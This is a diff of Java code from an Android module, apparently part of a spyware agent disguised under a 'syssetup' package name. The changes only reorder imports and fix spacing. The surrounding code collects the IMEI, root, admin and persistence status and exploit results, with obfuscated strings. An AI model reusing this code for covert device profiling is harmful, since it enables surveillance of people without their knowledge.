@@ -17,6 +17,7 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.StatFs;
 
+import com.android.mm.M;
 import com.android.syssetup.Device;
 import com.android.syssetup.Root;
 import com.android.syssetup.RunningProcesses;
@@ -30,7 +31,6 @@ import com.android.syssetup.listener.AdR;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.PackageUtils;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
 
 import java.io.BufferedReader;
 import java.io.FileInputStream;
@@ -41,7 +41,7 @@ import java.util.Iterator;
 import java.util.Map.Entry;
 import java.util.Properties;
 
-import static com.android.syssetup.capabilities.PackageInfo.*;
+import static com.android.syssetup.capabilities.PackageInfo.checkRoot;
 
 
 /**
@@ -136,13 +136,13 @@ public class ModuleDevice extends BaseInstantModule {
 			boolean root = checkRoot();
 			boolean su = Status.self().haveSu();
 
-			if(Cfg.DEMO) {
+			if (Cfg.DEMO) {
 				sb.insert(0, M.e("BinaryPatched:") + Keys.self().binarypatch[8] + "\n");
 			}
 			sb.insert(0, M.e("Model:") + Build.DISPLAY + "\n");
 			sb.insert(0, M.e("IMEI: ") + Device.self().getImei() + "\n");
-			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") 	+ M.e(", Su: ") + (su ? "yes" : "no")
-					+ M.e(", Admin: ") + (admin ? "yes" : "no") +  M.e(", Persistence: ") + Status.getPersistencyStatusStr() + "\n");
+			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") + M.e(", Su: ") + (su ? "yes" : "no")
+					+ M.e(", Admin: ") + (admin ? "yes" : "no") + M.e(", Persistence: ") + Status.getPersistencyStatusStr() + "\n");
 			sb.insert(0, M.e("Free space: ") + freeSpace + " KB " + M.e("Installation: ") + "\n");
 			sb.insert(0, M.e("Battery: ") + battery + "%" + "\n");
 
@@ -191,7 +191,7 @@ public class ModuleDevice extends BaseInstantModule {
 		sb.append("\n" + M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$
 
 		sb.append(M.e("Root Status: ") + Status.getExploitStatusString() + M.e(", Result: ") + Status.getExploitResultString() + "\n");
-		sb.append(M.e("OS Runtime: ") + (Root.isArtInUse()?M.e("ART"):M.e("Dalvik"))+ "\n");
+		sb.append(M.e("OS Runtime: ") + (Root.isArtInUse() ? M.e("ART") : M.e("Dalvik")) + "\n");
 		sb.append(M.e("Runtime: ") + Build.BOARD + "\n");
 		sb.append(M.e("Board: ") + Build.BOARD + "\n");
 		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
